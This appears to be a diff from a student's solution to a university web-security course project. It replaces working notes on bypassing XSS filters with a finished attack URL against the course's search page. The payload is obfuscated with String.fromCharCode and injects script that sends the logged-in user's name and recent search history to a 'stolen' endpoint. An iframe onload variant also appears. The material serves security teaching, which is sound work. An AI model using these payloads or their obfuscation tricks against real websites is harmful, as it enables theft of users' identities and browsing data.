@@ -1,16 +1,1 @@
-#So we can't use ; ' or "
-
-#we could use backticks
-`
-
-#also this works without the "" around alert, not sure if thats useful
-<IFRAME SRC=# onload=alert(0)></IFRAME>
-
-<IFRAME SRC=# onload=$(document).ready(alert(0))></IFRAME>
-
-
-#can use this
-$(document).ready(location.pathname=String.fromCharCode(115, 116, 111, 108, 101, 110, 63, 117, 115, 101, 114, 61) + $(String.fromCharCode(35, 108, 111, 103, 103, 101, 100, 45, 105, 110, 45, 117, 115, 101, 114)).text() + String.fromCharCode(38, 108, 97, 115, 116, 95, 115, 101, 97, 114, 99, 104, 61) + $(String.fromCharCode(35, 104, 105, 115, 116, 111, 114, 121, 45, 108, 105, 115, 116, 32, 46, 104, 105, 115, 116, 111, 114, 121, 45, 105, 116, 101, 109, 58, 101, 113, 40, 49, 41)).text())
-
-#lol the defenses aren't incremental, we can use script again
-<script>$(document).ready(function(){location.pathname=String.fromCharCode(115, 116, 111, 108, 101, 110, 63, 120, 115, 115, 100, 101, 102, 101, 110, 115, 101, 61, 51, 38, 117, 115, 101, 114, 61) + $(String.fromCharCode(35, 108, 111, 103, 103, 101, 100, 45, 105, 110, 45, 117, 115, 101, 114)).text() + String.fromCharCode(38, 108, 97, 115, 116, 95, 115, 101, 97, 114, 99, 104, 61) + $(String.fromCharCode(35, 104, 105, 115, 116, 111, 114, 121, 45, 108, 105, 115, 116, 32, 46, 104, 105, 115, 116, 111, 114, 121, 45, 105, 116, 101, 109, 58, 101, 113, 40, 49, 41)).text()})</script>
+https://eecs388.org/project2/search?xss_defense=3&q=%3Cscript%3E%24(document).ready(function()%7Blocation.pathname%3DString.fromCharCode(115%2C%20116%2C%20111%2C%20108%2C%20101%2C%20110%2C%2063%2C%20120%2C%20115%2C%20115%2C%20100%2C%20101%2C%20102%2C%20101%2C%20110%2C%20115%2C%20101%2C%2061%2C%2051%2C%2038%2C%20117%2C%20115%2C%20101%2C%20114%2C%2061)%20%2B%20%24(String.fromCharCode(35%2C%20108%2C%20111%2C%20103%2C%20103%2C%20101%2C%20100%2C%2045%2C%20105%2C%20110%2C%2045%2C%20117%2C%20115%2C%20101%2C%20114)).text()%20%2B%20String.fromCharCode(38%2C%20108%2C%2097%2C%20115%2C%20116%2C%2095%2C%20115%2C%20101%2C%2097%2C%20114%2C%2099%2C%20104%2C%2061)%20%2B%20%24(String.fromCharCode(35%2C%20104%2C%20105%2C%20115%2C%20116%2C%20111%2C%20114%2C%20121%2C%2045%2C%20108%2C%20105%2C%20115%2C%20116%2C%2032%2C%2046%2C%20104%2C%20105%2C%20115%2C%20116%2C%20111%2C%20114%2C%20121%2C%2045%2C%20105%2C%20116%2C%20101%2C%20109%2C%2058%2C%20101%2C%20113%2C%2040%2C%2049%2C%2041)).text()%7D)%3C%2Fscript%3E
